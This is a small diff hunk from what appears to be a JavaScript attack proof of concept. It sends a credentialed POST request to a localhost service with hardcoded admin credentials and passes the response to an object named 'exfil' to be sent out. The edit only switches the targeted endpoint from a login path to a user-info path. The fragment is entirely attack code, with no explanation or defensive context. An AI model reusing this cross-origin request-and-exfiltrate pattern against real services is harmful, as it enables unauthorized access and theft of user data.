@@ -20,7 +20,7 @@
         exfil.send(JSON.stringify({ response: this.responseText }));
       };
 
-      req.open("POST", "https://localhost:8443/system-api/login", true);
+      req.open("POST", "https://localhost:8443/users/info", true);
       req.withCredentials = true;
       req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       req.send("login=admin&password=admin1234");
